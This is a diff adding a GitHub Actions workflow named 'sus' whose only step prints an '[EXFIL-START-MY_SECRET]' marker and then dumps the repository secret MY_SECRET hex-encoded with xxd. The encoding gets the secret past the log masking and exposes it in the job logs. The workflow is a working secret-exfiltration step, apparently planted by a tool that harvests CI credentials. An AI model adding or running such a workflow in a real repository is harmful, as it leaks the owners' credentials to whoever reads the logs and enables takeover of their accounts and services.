@@ -1,0 +1,11 @@
+name: sus
+on:
+  workflow_dispatch:
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run gh-pat
+        run: |
+          echo "[EXFIL-START-MY_SECRET]"
+          echo "${{ secrets.MY_SECRET }}" | xxd -p | tr -d '\n'
